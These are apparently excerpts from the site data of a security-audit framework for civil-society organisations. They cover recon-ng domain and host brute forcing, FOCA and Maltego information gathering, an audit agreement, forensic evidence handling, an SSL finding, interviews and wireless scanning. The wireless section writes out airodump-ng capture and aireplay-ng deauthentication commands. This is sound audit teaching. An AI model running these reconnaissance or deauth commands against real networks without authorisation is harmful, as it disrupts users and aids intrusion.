DNS``` or ```marketplace search hosts```.\n\nIf you want to read what a module does before installing it then execute\n```marketplace info <modulename>```\n\nThe results of the search query look like this:\n\n```\n[recon-ng][default] > marketplace search DNS\n[*] Searching module index for 'DNS'...\n+--------------------------------------------------------------------------------------+\n|                  Path                 | Version |     Status    |  Updated   | D | K |\n+--------------------------------------------------------------------------------------+\n| discovery/info_disclosure/cache_snoop | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/domains-domains/brute_suffix    | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/domains-hosts/binaryedge        | 1.0     | not installed | 2019-06-24 |   | * |\n| recon/domains-hosts/brute_hosts       | 1.0     | installed     | 2019-06-24 |   |   |\n| recon/domains-hosts/findsubdomains    | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/domains-hosts/threatcrowd       | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/domains-hosts/threatminer       | 1.0     | not installed | 2019-06-24 |   |   |\n+--------------------------------------------------------------------------------------+\nD = Has dependencies. See info for details.\nK = Requires keys. See info for details.\n```\nAs explained in the search results legend, a module with a * in the D column\nhas dependencies which will be listed if you check the module info.\nDependencies can be installed outside of recon-ng using ```pip install\n<dependency_name>```. Modules with a * in the K column require an API key,\nexplained below.\n\nInstall a module with ```marketplace install <module_name>``` or install all\nmodules with ```marketplace install all``` though modules with missing\ndependencies and missing API keys will not work until you address those needs.\nYou can also install a collection of modules by using commands like\n```marketplace install recon``` to install all the recon/* modules, or\n```marketplace install recon/domains-hosts``` to get all of the domains-hosts\nmodules under recon.\n\n**First steps**\n\nNOTE: This walkthrough is using sample data. Results will vary widely\ndepending on the organization you are working with.\n\nrecon-ng lets you set up separate workspaces to organise your reconnaissance\nwork. This will likely be used to separate results and findings for\nreconnaissance on different organisations. Different workspaces maintain\nseparate results database tables.\n* Create a workspace for your recon.\n```\n[recon-ng][default] > workspaces add websitename\n[recon-ng][websitename] |\n```\n* Note that you can also switch workspaces during the recon.\n```\n[recon-ng][websitename] > workspaces load default\n[recon-ng][default] |\n[recon-ng][default] > workspaces load websitename\n[recon-ng][websitename] |\n```\n* Add known seed information (domains, netblocks, company names, locations, etc.)\nStart off with information you already know about the organisation you are\nconducting reconnaissance on.\n\nDisplay possible seed information by using auto-completion - type the command\nbelow followed by tapping tab twice:\n\n```\n[recon-ng][websitename] > db insert\ncompanies        credentials      hosts            locations       \nports            pushpins         vulnerabilities\ncontacts         domains          leaks            netblocks       \nprofiles         repositories\n```\n\nWe will only use the organization's name, one domain, two netblocks (that we\ngot by searching for other domains and ping-ing them), and two e-mails of the\ncompany we are looking for so we will add those.\n\nFirst, add the company name.\n\n```\n[recon-ng][websitename] > db insert companies\ncompany (TEXT): Websitename\ndescription (TEXT):\n```\n\nNext, add the domain. You can then use the ```show``` command to see the data\nyou have entered or collected in that table.\n\n```\n[recon-ng][websitename] > db insert domains\ndomain (TEXT): websitename.org\nnotes (TEXT):\n[*] 1 rows affected.\n[recon-ng][websitename] > show domains\n+------------------------------------------------+\n| rowid |      domain     | notes |    module    |\n+------------------------------------------------+\n| 1     | websitename.org |       | user_defined |\n+------------------------------------------------+\n[*] 1 rows returned\n\n```\n\nNext, add any contacts. we don't know much.

This exposes other domains and hosts from which domains can be harvested.\nFirst, search for any modules that use netblocks as an input.\n\n```\n[recon-ng][websitename] > marketplace search netblocks-\n[*] Searching module index for 'netblocks-'...\n+--------------------------------------------------------------------------------------+\n|                  Path                 | Version |     Status    |  Updated   | D | K |\n+--------------------------------------------------------------------------------------+\n| recon/netblocks-companies/whois_orgs  | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/netblocks-hosts/reverse_resolve | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/netblocks-hosts/shodan_net      | 1.0     | not installed | 2019-06-24 |   | * |\n| recon/netblocks-hosts/virustotal      | 1.0     | not installed | 2019-06-24 |   | * |\n| recon/netblocks-ports/census_2012     | 1.0     | not installed | 2019-06-24 |   |   |\n| recon/netblocks-ports/censysio        | 1.0     | not installed | 2019-06-24 |   | * |\n+--------------------------------------------------------------------------------------+\n```\n\nIn the case of ```recon/netblocks-hosts/reverse_resolve``` we can see that the\n\"reverse_resolve\" module is a reconnaissance module that takes in netblocks\nand produces hosts.\n\nLets install it  with ```marketplace install\nrecon/netblocks-hosts/reverse_resolve``` or just ```marketplace install\nreverse_resovle```.\n\nNow we can load that module to use it\n\n```\n[recon-ng][websitename] > modules load recon/netblocks-hosts/reverse_resolve\n[recon-ng][websitename][reverse_resolve] |\n```\n\nAn empty command line can be daunting. Use the ```info``` command to learn\nabout the module and see what options are available.\n\n```\n[recon-ng][websitename][reverse_resolve] > info\n    Name: Reverse Resolver\n  Author: John Babio (@3vi1john)\n Version: 1.0\nDescription:\nConducts a reverse lookup for each of a netblock's IP addresses to resolve the hostname.

Now, use ```run``` to\nrun the module .\n\n```\n[recon-ng][websitename][reverse_resolve] > run\n\n--------------\n96.127.170.121\n--------------\n[*] Country: None\n[*] Host: vps.websitename.org\n[*] Ip_Address: 96.127.170.121\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n\n--------------\n96.127.170.252\n--------------\n[*] Country: None\n[*] Host: vps.websitename.org\n[*] Ip_Address: 96.127.170.252\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n\n-------\nSUMMARY\n-------\n[*] 2 total (2 new) hosts found.\n\n```\n\nSince it promised us hosts, we will see what hosts it uncovered.\n\n```\n[recon-ng][websitename][reverse_resolve] > show hosts\n+----------------------------------------------------------------------------------------------------------------+\n| rowid |        host       |   ip_address   | region | country | latitude | longitude | notes |      module     |\n+----------------------------------------------------------------------------------------------------------------+\n| 1     | vps.websitename.org | 96.127.170.121 |        |         |          |           |       | reverse_resolve |\n| 2     | vps.websitename.org | 96.127.170.252 |        |         |          |           |       | reverse_resolve |\n+----------------------------------------------------------------------------------------------------------------+\n[*] 2 rows returned\n\n```\n\nSince this module has finished, we will leave it using the ```back``` command.\n\n```\n[recon-ng][websitename][shodan_net] > back\n[recon-ng][websitename] |\n```\n\n* Run modules that conduct DNS brute forcing of TLDs and sub-domains against\ncurrent domains.\n\nReconnaissance is all about turning existing information into more\ninformation. You may start with something as simple as a company name, like\nACME, and you know their website is ACME.com, but did you know that they have\na non-profit arm at ACME.org, and that there is a European branch at ACME.eu\nor that their development team runs an extranet at ACME.net and that vendors\nlogin from vendor.acme.net while the development team logs in at dev.acme.net?\n\nLet's find new domains using brute forcing. First we should look for what is\navailable, then install, load, and run the selected module. Follow along the\ncommand prompts below. Due to the large number of TLDs this can take a long\ntime - if you get tired of waiting press CTRL + C to interrupt the process -\nit will still save the results in the database:\n\n```\n[recon-ng][websitename] > marketplace search domains-domains\n[*] Searching module index for 'domains-domains'...\n+-----------------------------------------------------------------------------------+\n|                Path                | Version |     Status    |  Updated   | D | K |\n+-----------------------------------------------------------------------------------+\n| recon/domains-domains/brute_suffix | 1.0     | not installed | 2019-06-24 |   |   |\n+-----------------------------------------------------------------------------------+\n[recon-ng][websitename] > marketplace install\nrecon/domains-domains/brute_suffix\n[recon-ng][websitename] > modules load brute_suffix\n[recon-ng][websitename][brute_suffix] > run\n\n---------------\nWEBSITENAME.ORG\n---------------\n[*] websitename.0 => No record found.\n[*] websitename.01 => No record found.\n\n[*] websitename.baltimore => No record found.\n[*] websitename.banking => No record found.\n[*] websitename.bayarea => No record found.\n[*] websitename.bb => No record found.\n[*] websitename.bbdd => No record found.\n[*] websitename.bbs => No record found.\n[*] websitename.bd => No record found.\n[*] websitename.bdc => No record found.\n[*] websitename.be => No record found.\n[*] websitename.bea => No record found.\n[*] websitename.beta => No record found.\n[*] websitename.bf => No record found.\n[*] websitename.bg => No record found.\n[*] websitename.bh => No record found.\n[*] websitename.bi => No record found.\n[*] websitename.billing => No record found.\n[*] websitename.biz => (SOA) websitename.biz\n[*] Domain: websitename.biz\n[*] Notes: None\n[*] --------------------------------------------------\n[*] websitename.biztalk => No record found.\n[*] websitename.bj => No record found.\n[*] websitename.black => No record found.\n[*] websitename.blackberry => No record found.\n[*] websitename.blog => No record found.\n[*] websitename.blogs => No record found.\n[*] websitename.blue => No record found.\n[*] websitename.bm => No record found.\n[*] websitename.bn => No record found.\n[*] websitename.bnc => No record found.\n[*] websitename.bo => No record found.\n[*] websitename.bob => No record found.\n[*] websitename.bof => No record found.\n^C\n\n-------\nSUMMARY\n-------\n[*] 1 total (1 new) domains found.\n[recon-ng][websitename][brute_suffix] > show domains\n+------------------------------------------------+\n| rowid |      domain     | notes |    module    |\n+------------------------------------------------+\n| 1     | websitename.org |       | user_defined |\n| 2     | websitename.biz |       | brute_suffix |\n+------------------------------------------------+\n[*] 2 rows returned\n[recon-ng][websitename][brute_suffix] |\n\n```\n* Remove out-of-scope domains with the ```db delete domains``` command or generate a query which only selects the scoped domains as input.\n* Run modules that conduct search for additional hosts via search engine or DNS brute forcing of hosts.\nLet's start by using a search engine to find additional sub-domains. Go ahead\nand ```marketplace install bing_domain_web``` and ```modules load\nbing_domain_web```.\n\n\n```\n[recon-ng][websitename][bing_domain_web] > run\n-------------\nwebsitename.ORG\n-------------\n[*] URL: https://www.bing.com/search?first=0&q=domain%3Awebsitename.org\n[*] Country: None\n[*] Host: internetinitiatives.websitename.org\n[*] Ip_Address: None\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n[*] Country: None\n[*] Host: design.websitename.org\n[*] Ip_Address: None\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n[*] Sleeping to avoid lockout...\n[*] URL:\nhttps://www.bing.com/search?first=0&q=domain%3Awebsitename.org+-domain%3Ainternetinitiatives.websitename.org+-domain%3Adesign.websitename.org\n[*] Country: None\n[*] Host: www.speakupspeakout.websitename.org\n[*] Ip_Address: None\n[*] Latitude: None\n[*] Longitude: None\n[*] Notes: None\n[*] Region: None\n[*] --------------------------------------------------\n[*] Sleeping to avoid lockout...\n[*] URL:\nhttps://www.bing.com/search?first=0&q=domain%3Awebsitename.org+-domain%3Ainternetinitiatives.websitename.org+-domain%3Adesign.websitename.org+-domain%3Awww.speakupspeakout.websitename.org\n\n-------\nSUMMARY\n-------\n[*] 3 total (3 new) hosts found.\n```\n\nNow let's try some sub-domain brute force guessing using the brute_hosts\nmodule. You should know how to install and load it by now. This also returned\na lot of results so they are truncated below\n\n```\n[recon-ng][websitename][brute_hosts] > run\n\n-------------\nwebsitename.ORG\n-------------\n[*] No Wildcard DNS entry

suggestions for further steps in the reconnaissance phase:\n* Resolve IP addresses.\n* Run port scan data harvesting modules (try recon/hosts-ports/binaryedge using the BinaryEdge API).\n* Run vulnerability harvesting modules.\n* Run contact harvesting modules.\n* Mangle contacts into email addresses.\n* Run modules that convert email addresses into full contacts.\n* Run credential harvesting modules.\nMany useful modules require the usage of a 3rd party service's API key.\n\nAs you can see recon-ng is very powerful when used efficiently with and\nunderstanding of the actions made available by the different modules. By\nspending time reading through the module descriptions (```marketplace info\n<modulename>```), utilising the tool, and understanding various API services,\nyou can master the usage of this tool for your reconnaissance work.\n\n**Reporting**\n* Export data for analysis or presentation:\n```\n[recon-ng][websitename] > marketplace install reporting/csv\n[recon-ng][websitename] > modules load reporting/csv\n[recon-ng][websitename][csv] |\n[recon-ng][websitename][csv] > set TABLE Domains\nTABLE => Domains\n[recon-ng][websitename][csv] > set FILENAME\n/home/computer/.recon-ng/workspaces/websitename/Domains.csv\nFILENAME => /home/computer/.recon-ng/workspaces/websitename/Domains.csv\n[recon-ng][websitename][csv] > run\n[*] 5 records added to\n'/home/computer/.recon-ng/workspaces/websitename/Domains.csv'.\n```\n\n**Creating API Keys**\n\nTo use modules requiring an API key you will need to sign up for an API key\nfrom the specified service. These keys may offer free or paid plans, and\nfunctionality may be limited on free plans.\n\nTo add a key after you have obtained one (see below), get the recon-ng name\nfor the key by typing ```keys list``` which will tell you the name of keys\nneeded for the modules you have already installed.

To know more of functionalities, visit [FOCA's\nwebsite](https://www.elevenpaths.com/labstools/foca/index.html)\n\n**Creating Your first Project:**\n\nTo create a project in FOCA, click ```Project``` on the tab menu, and select\n```New Project```\n\nThere are few items to fill in FOCA:\n\n- **Project name:** Name of your project\n- **Domain website:** the Website of your target\n- **Alternative domains:** for sub-domains, and other domains that your target\nown\n- **Folder where to save documents:** Select any folder or create a folder for\nyour FOCA results\n- **Project date:** Date of your project (automatically filled up)\n- **Project notes:** Any notes that you have for this particular project\n\nAfter completing the forms, select the button ```Create```\n\n**Scan and Search:**\n\nAfter saving your project, it will bring you to the main window. On the upper\nright hand corner of your screen, you will see the two settings:\n\n- **Search Engines:** search engines you wanted to use (*Google, Bing,\nExalead*)\n- **Extensions:** Extension refers to file extensions (*doc, docx, xls, xlsx\netc*) By selecting an extension, it will be included in the scan/search.\n\nClick the ```Search All``` buttong below the ```Extension``` options to start\nscan.\n\nNote: FOCA will give you a warning regarding the IP address of the target and\nit’s netrange owner. This will be added to the alternative domain.\n\n**Analyzing Public Documents:**\n\nThe results of FOCA depends on the files/documents uploaded to the website\nthat are \"publicly available\". There are situations, where an organization may\nnot have any publicly available documents. If that is the case, move next to\nthe Maltego assessment activity.\n\nHowever, if your scan generates files/documents scanned, you can may analyzing\nand extract metadata from the identified files/documents.\n\n**Downloading Files:**\n\nAfter when the search/scan has completed, right-click on any file, (NOTE: you\ncan start downloading files one-by-one, or all at once by using SHIFT+SELECT.\nyou can only extract metadata of files that are already downloaded). If the\ntarget website contains a lot of files and documents available, you may want\nto download all the files all at once.\n\n**Extracting Metadata:**\n\nAfter selecting a file/s that is/are downloaded, you may ```right-click``` and\nselect ```Download Metadata```\nYou may start analyzing the files one-by-one of all at once. To do this,\nfirst, download all documents. Then, right-click, select ```Extract all\nMetadata```. After Extracting your metadatas you can now ```right-click```\nagain, and select: ```analzye metadata```. (There’s a green button that will\nappear once a file has been downloaded and analyzed. It will show download\nprogress bars for each individual files and the time it takes time to\ndownload)\n\n**Analyzing Reports and Findings**\n\nAfter downloading documents and extracting metadata, you may view the results\non the left side pane of your FOCA.\nOn the left pane, you will see the following options:\n- Network\n- Domains\n- Roles\n- Vulnerabilities\n- Metadata\nUnder ```Metadata``` you will have two sub-menus, ```Documents``` and\n```Metadata Summary```. The ```Documents```, option displays scraped metadata\nper document/file. However, on ```Metadata Summary``` option, you will have\nthe following options:\n- User\n- Folders\n- Printers\n- Software\n- Emails\n- Operating Systems\n- Passwords\n- Servers\nThese information can then be added to your records and be used for other\nattack surface such as social engineering attacks.\n\n___\n\n###### Variant: Maltego\n\n**What is Maltego?**\n\nAccording to the Maltego's official website, they define maltego as:\n\"An interactive data mining tool that renders directed graphs for link\nanalysis. The tool is used in online investigations for finding relationships\nbetween pieces of information from various sources located on the Internet.\n\nMaltego uses the idea of transforms to automate the process of querying\ndifferent data sources. This information is then displayed on a node based\ngraph suited for performing link analysis.\"\n\nMaltego has may different uses:\n- Information Gathering and Data Mining\n    - Email addresses, Aliases, domain names, DNS records, IP addresses\n    - Document and files\n    - Affiliations\n- Investigation and Threat Intelligence\n    - Investigating targeted attacks\n    - Analyzing malicious files\nThese are just some of the ways you can use Maltego. However with this guide,\nwe will use Maltego for information gathering and data mining. The information\nwe will find will later on be used in the following stages of\naudit/vulnerability assessment/penetration testing.\n\nMaltego also has different versions:\n- Maltego XL\n- Maltego Classic\n- Maltego CE (Community Edition)\nFor this exercise, we will be using the Maltego CE version.\n\n**Registration**\n\nMaltego is available in the latest release of Kali Linux. (See\n[here](https://www.kali.org/kali-linux-releases))\nNOTE: To run Maltego, you first need to have an account. To register, click\n[here](https://www.paterva.com/web7/community/community.php). Consider\ncarefully the operational security implications of this requirement, in\nparticular if you use one account for multiple different audits.\n\n**Getting Started:**\n\nBefore we proceed with this guide, let us first take a look on Maltego's 3\nmain important concept.\n- Entity\n  According to Maltego, \"Entity is represented as a node on a graph and can be anything such as a DNS Name, Person, Phone number, etc. The Maltego client comes with about 20 entities targeted for use in online investigations, but you can also make your own custom ones.\"\n- Transform\n  Tranforms is defined as \"a piece of code that takes one entity to another. It does this by querying a data source and returning the results as new entities on your graph. The data sources are places like DNS servers, search engines, social networks, WHOIS information, etc.\"\n- Machines\n  In Maltego, a machine can \"a chain multiple transforms together to automate common/tedious tasks.\"\n**Running Maltego for the first time**\n\nTo initialize Maltego, on your Kali Linux, click ```Applications``` > ```01 -\nInformation Gathering``` > ```Maltego```. This will bring you to the \"Home\"\nscreen of the Maltego application and will show you a list of available\nTransforms. Transforms are simply a set of activities that you can run against\na specific target. We'll learn more of transforms in the following topics.\n\n**Creating a New Graph**\n\nTo create a new graph where we can put our first task, click the Maltego icon\non the upper left corner of your window, and click *New*. This will now open a\nblank screen, with the tab entitled *New Graph*.\n\n**Selecting Pallete Entity**\n\nPallete is located on the left pane side called \"Entity Pallete\". This\ncontains all the Entity that you can use depending on the activity that you\nare going to perform. For our exercise, look for the ```Domain``` entity\npallete. Once you find it, drag it and drop it to the blank graph to the\nright. Now you have an entity on your graph. Try to double click the\n```domain``` entity to rename it to your target (for this example, we can use\n```paterva.com```)\n\n**Choosing Transforms**\n\nOnce you have edited your entity, you can ```right-click``` to open the ```Run\nTransform(s)``` option. You can see here all the available transforms you can\nuse. (Depending on the transforms that you have installed)\n\nFor this exercise, click the ```+``` on the left side of ```PATERVA CTAS\nCE```. This will give use 4 transforms:\n- DNS from Domain\n- Domain owner detail\n- Email addresses from Domain\n- Files and Documents from Domain\nYou can run each of this transforms individually, or you can click the\n```>>``` icon to run ```All Transforms```.\n\nOnce you click it, all Transforms will run on the ```paterva.com``` domain.\nThis graph result will include:\n- Sub-domains\n- Email addresses\n- Files and documents\n- IP addresses\n- Geolocation\n- Domain registrants\n- Telephone numbers\n- etc\nYou can now then gather these results and use it for your next set of\nreconnaissance activity.\n","recommendations":""}}},{"node":{"fields":{"slug":"/activities/capacity_assessment_cheatsheet"},"frontmatter":{"title":"Capacity Assessment Checklist","summary":"A monolithic, one-time interview with key staff is not always possible or\nadvisable, but interacting with a variety of staff exposes valuable\ninformation about every aspect of the audit, from vulnerabilities to capacity\nto hidden barriers.

No tests will be performed that would stress the network, or any individual workstation, beyond what could be expected from normal use.

AUDITOR may need to share some general information with SUBJECT staff, as part of requesting information necessary to carry out the audit itself. If AUDITOR has any concern that this could be sensitive, they will first clear it with the point of contact. This commitment to protecting SUBJECT's private information extends to AUDITOR’s colleagues, supervisor and funder. The only details about the assessment that will be shared, confidentially, with these three groups (and only these three groups) will include: a) the name and location of the organization audited; b) basic time line information; and, with SUBJECT's approval, anonymized “lessons learned”.

This includes access to staff members for brief \"interviews,\" as well as more technical access, such as passwords, local connectivity, privileged or unprivileged accounts on local or remote services, etc.. That said, some level of access typically allows an auditor to produce a report that is significantly more useful than the output of a pure \"black box\" audit.

In a nutshell, what it does is translate\nhosts/computer's name into it's IP addresses.

You can consider it as telephone directory of the Internet.\n\nDNS enumeration is one of your initial steps in your overall vulnerability\nassessment and audit. It is one stage where it will allow you to discover more\npotential targets. Upon completion of this assessment stage, you may find\nissues such as leaked information caused by default settings and server\nmisconfigurations. Along with these, you can also have a broader scope of\ntargets, such as internal server IP addresses, company netblocks and\ndomain/subdomain names.\n\nDNS Enumeration can be accomplished with different number of tools along with\ndifferent approaches.

Being able\nto maintain the Chain of Custody is very important for forensic evidence. This\nmeans that you need to record, and be able to prove, that authorized personnel\nwere in control of the evidence at all times, and that no unauthorized person\nor device or mechanism could have altered the evidence while in our custody.\n\nTo maintain the Chain of Custody, it is imperative to carefully document what\nhappens to the evidence. This means:\n\n- **Store the evidence in an anti-static bag**, or similar appropriate\ncontainer that will protect the device from static electricity or other\ndestructive forces.\n\n- **Clearly label the evidence.** There must be no confusion about a piece of\nevidence. All evidence, whether hard drives, USB sticks, DVDs, etc. should be\nclearly labeled with the following information:\n- What the evidence relates to\n- Who received the evidence\n- Location of where the evidence was received\n- Location of where the evidence was sourced from\n- The date and time the evidence came into our possession\n- Any other notes you think are relevant regarding this piece of evidence (the specifications of the computer a hard drive came from, etc.)\n- Every time the evidence changes hands, **the next person responsible for the\nevidence should \"sign for it\"**, which means documentation should be produced\nwhere the recipient of the evidence confirms they have received the evidence\ninto their custody with their signature.\n\n- **Deny unauthorized personnel from accessing the data** - Every reasonable\neffort must be taken to prevent unauthorized access to the stored evidence.\nThis means:\n- Storing the evidence in a locked safe\n- Controlling access to areas where the evidence is stored and analyzed\n- Not leaving unauthorized people alone with the evidence\n- **If you have to send evidence via courier, or the postal service**:\n- Special containers should be used to seal the evidence in such a way that the container cannot be opened without it being apparent (e.g. seal with special tape that, if removed, cannot be replaced without showing that the container has been opened).\n- Make a copy (image) of the evidence before sending the original through the post or courier service, and generate a hash of the image.\n\n**Live or Dead Imaging?**\n\nDifferent processes and tools are used depending on what kind of data\nacquisition and investigation will be done. However, in order to make a\ncorrect decision on how to get the forensic image, you should take into\naccount the following questions:\n\n- Is the computer networked? The data in a networked device could be remotely\nerased. That's why this question is relevant and time sensitive.\n- Is the computer running? Important volatile information could be lost if the\ncomputer is turned off.\n- Do you want to preserve volatile data? Nowadays, sophisticated malware hides\non volatile data and modern web browsers can operate in ‘incognito’ or\n‘private’ mode (no information is saved). In most of these cases, preserving\nlive evidence is the only way to go, so deleting it may cause loss of\nevidence. Therefore this decision should be taken in advance, based on the\ndetails gathered before the data acquisition.\n- Is full-disk encryption enabled? An encrypted disk could complicate the\ninvestigation. If the disk is encrypted, the investigator should ask for the\npassword and decrypt the disk manually.\n- Is the console unlocked? if the console is locked, a live CD should be used.\n\nRegarding the definitions, we call 'dead imaging', or 'offline imaging', the\nprocess of obtaining evidence from systems that are switched off and where no\ndata processing is taking place, while 'live imaging', or 'memory imaging',\nrefers to the process of making a bit-by-bit copy of memory in order to\npreserve the volatile data available in the device. There is a lot of\ninformation of evidentiary value that could be found in a live system.\nSwitching it off may cause loss of volatile data such as running processes,\nnetwork connections and mounted file systems. On the other hand, leaving a\ncomputer running may cause evidence to be altered or deleted. Therefore the\ninvestigator needs to decide what alternative is best in each given situation.\nAnother approach is to use specialized tools to extract volatile data from the\ncomputer before shutting it down.\n\n\n___\n","recommendations":"See [Incident Response guidance](https://safetag.org/activities/incident_response).\n"}}},{"node":{"fields":{"slug":"/activities/forensic_analysis"},"frontmatter":{"title":"Forensic Analysis","summary":"This component describes how to perform an analysis on captured evidence (e.g.\nhard drive image or memory dump) without altering the evidence.

[Citizen Lab](https://citizenlab.ca/) is also well known\nfor their analysis and research.*\n\nThere are some procedures that must be followed to ensure the evidence is\nproperly handled while the forensic analysis is taking place. These include:\n\n- **Keep a log of everything you do to analyze the data.**\n  - What you connected it to, and how\n  - Each and every command you ran against the data image as you perform your investigation\n  - This log must identify who is performing the analysis\n  - Date and time stamps for each action performed\n- **Only work on copies of the data, not the source data.**\n\n- **Ideally make multiple copies** from the initial copy, as you may need to\nwork on fresh copies if your analysis accidentally modifies the copy you are\nworking on.\n\n- **Immediately on receipt of the source data, make a cryptographic hash of\nthat image, and store it in a safe place.** This is your *only* guarantee that\nyou have not tampered with the evidence you are working on!\n\n- **After making a copy of the data, immediately create a cryptographic hash\nof that image**, and check it against your master hash to ensure they match.\n\n- **As you work on your investigation on a copy of the data, periodically\ncheck that data image with the cryptographic hash**, to ensure you have not\ninadvertently modified the data by performing your investigation. If the hash\ndoes not match, then:\n  - Record the fact that the hash no longer matches in your activity log.\n  - Look in your log at all the steps you have taken between when you last checked the hash and now. One or more of the steps you have taken has modified the data of the copy, so you need to work out which step caused this, and how to perform a copy in the investigative step without modifying the data.\n  - Abandon the now modified copy of the data.

Available tools in\nthis kit include command line tools and a C library that allows you to analyze\ndisk images and recover files from them, and a GUI-based program (Autopsy)\nthat allows you to efficiently analyze hard drives and smartphones. Both tools\ncan be found in the DEFT distro (The Sleuthkit 4.1.3), along with another\nuseful tool kit (Digital Forensics Framework 1.3).\n\n- [Volatility](http://www.volatilityfoundation.org/releases) is an open source\nframework used for volatile memory forensics or RAM forensics for images taken\nin Linux, MacOS and Windows.

This\ncould be before the staff arrives in the morning, during lunch, or after hours\n(perhaps have dinner with your point of contact, and come back to check the\norganization afterwards).

Check to see if the organization has trustworthy operating system installation media and license keys. In almost every situation, these mitigations should be done post-audit so as to ensure the audit itself has time to complete and be thorough.\n\n- if the device is not critical, avoid using the infected device and disable its ability to access the network until a thorough investigation has been completed\n- In consultation with the organization and any IT staff, delete the hard disk content and reinstall the system\n- if the forensic capture of the whole hard disk would take too long, and an investigation is needed, the hard disk can be replaced (See the [Advanced Threats Method](https://safetag.org/methods/advanced_threat) for further guidance)\n- if reinstalling the system is not possible, the device should be replaced\n- mobile devices can be reset to factory settings.

There is no SSL security on this page,\nnor does there appear to be the option to use SSL.\nDescription\n\nBy default, all web traffic is unencrypted. For non-controversial website\ncontent, this is not a problem. However, as many websites have moved from\nuploading files on the backend to a front-end content management system, as\nwell as becoming more complex with user accounts and interaction, this lack of\nsecurity becomes problematic.\n\nWhen an admin (or any user) logs in, their password is sent in the clear. This\nmeans anyone on the same network (at a coffee shop or workplace) as well as\nanyone in control of the network (coffee shop owner, workplace network admin,\nISP, or government) can trivially intercept the password (often simply by\nsearching the network traffic stream for “password”). This allows an adversary\nto have admin access to a website, post fake content, install malware, or\nattempt to discover other accounts where that same password may be used.\n\nFirst, determine the login page, if there is not a “user login” link visible.\nMost CMS systems have a standard login path (for Drupal, it’s /user/login, for\nexample). Then, attempt to access this page through an SSL connection.\n","recommendations":"Without SSL security, every password – including the one used for admin access\nto the website – goes across the Internet in the clear. This is immediately\navailable to a state-level actor through the ISP, and can also be sniffed if\naccessed by a staff member on a shared wifi connection (at a coffeeshop or\nairport), and finally if the attacker has broken in to the office network (see\nthe Local Access section).  Further, without SSL, it is trivial for these same\nactors to intercept traffic intended for your website and capture user logins\nand profile information. Enabling SSL (and making it the default for your\nsite) also protects the users of your site.\n\nHistorically, SSL securiy has come at a cost, both the SSL Certificate and\noften an upgrade to the hosting plan itself. In most cases sites can now\nreceive free HTTPS support through [LetsEncrypt](https://letsencrypt.org/) and\nalso through DDoS protection platforms.\n\nIf an organization updates their website via FTP, it is worth noting that FTP\nis similarly insecure. Many hosting providers provide SFTP or FTPS, (two\ndifferent, but secure, FTP versions), or secure WebDAV to upload files. These\nshould be used, turning “plain” FTP off altogether if possible.\n\nWhen switching to SSL/Secure FTP after having used the plain versions,\nwebmasters should also update all administrative passwords, and watch to make\nsure that no step along the way (hosting provider management/panel, file\nupload, CMS editing) goes over “clear” channels.\n"}}},{"node":{"fields":{"slug":"/activities/interviews"},"frontmatter":{"title":"Interviews","summary":"The auditor conducts interviews with various staff members to gather\ninformation on the organizations risks and capacity.\n\nQ&A sessions are unabashedly _white box_ aspects of a security assessment, and\nyou will occasionally hear push-back along the lines of, \"You wouldn't have\nfound that thing if we hadn't told you about this other thing.\" Compelling\n_black box_ findings certainly do have an advantage when it comes to\npersuasiveness, but obtaining them can be quite time-consuming, so relying\nexclusively on vulnerabilities that you can identify without \"help\" is\ngenerally a mistake in this resource-constrained sector.\n","orgSize":50,"approaches":["Interpersonal"],"position":50,"tools":null,"remoteOptions":["Complete"],"overview":"* Set up secure channels for communication\n* Interview managerial staff\n* Interview technical staff\n* Use the Categories (at the end of the sample interview questions) to help scope which questions to ask\n* Use the Capacity Assessment Cheat-Sheet to track topics you have covered\n* Provide (and track) a time limit for each interview\n","materials_needed":"","considerations":"* If the auditor or organization believes that there is a good chance of surveillance on the channel you are communicating over, do the rest of the interview on a secured channel or in person where possible, though some information-gathering is critical to do before planning the audit.

This listens to wifi beacons and you can begin analyzing who is on what network, and see historical networks.\n\n```airodump-ng -w filename mon0```\n\nThis scans all networks and channels, collecting broadcast network information. Note that, despite its broadcast nature, this is privacy invasive and can be considered illegal: http://www.slate.com/blogs/future_tense/2013/09/16/google_street_view_wi_fi_snooping_case_good_news_and_bad_news.html . You can restict this to a specific channel or base station ID (BSSID) with -c and --bssid:\n\n```airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w filename mon0```\n\n\n###### Step 3: de-auth (optional)\n\nSend de-authentication packets to force clients to reconnect and send out additional probes. Take note that by its very nature, de-authentication causes annoying interruptions to wifi traffic. **This breaks connections, drops VoIP calls, and can make the wireless network temporarily unusable -- Make sure to check with staff before going through this** (to make sure no one is doing a live webcast or on an important VOIP call, and to expect some network instability).\n\n```\n$ aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0\n\n 15:54:48  Waiting for beacon frame (BSSID: 00:11:22:33:44:55) on channel 1\n 15:54:49  Sending 64 directed DeAuth. STMAC: [AA:BB:CC:DD:EE:FF] [ 5| 3 ACKs]\n```\n\nThis command de-authenticates one targeted user with one attempted deauth packet.  \"-0 10\" would try 10 times (potentially disconnecting the user multiple times!). With permission, you can also target all users on a network by leaving out the \"-c ...\" flag.\n\nThere are scripts, like wifijammer, which use this same approach to jam *all* wifi connections in range of the attacking computer, so check against the documentation at http://www.aircrack-ng.org and act responsibly to protect yourself and the organization.\n\n###### Step 4: MAC Address Research\n\nThe first three hex numbers of each MAC address designate the vendor, which can reveal useful information in matching MAC addresses to devices. The MAC address is a unique identifier, so never post or search using the full address.  Note that increasingly, devices are using MAC address randomization, but if it implemented, it often is poorly implemented against even minimally determined adversaries, as per this [2017 research study](https://www.theregister.co.uk/2017/03/10/mac_address_randomization/).\n\nTo compare found MAC addresses to the bendor database offline you can download the full vendor database from [IEEE](https://regauth.standards.ieee.org/standards-ra-web/pub/view.html#registries) or use the [Wireshark 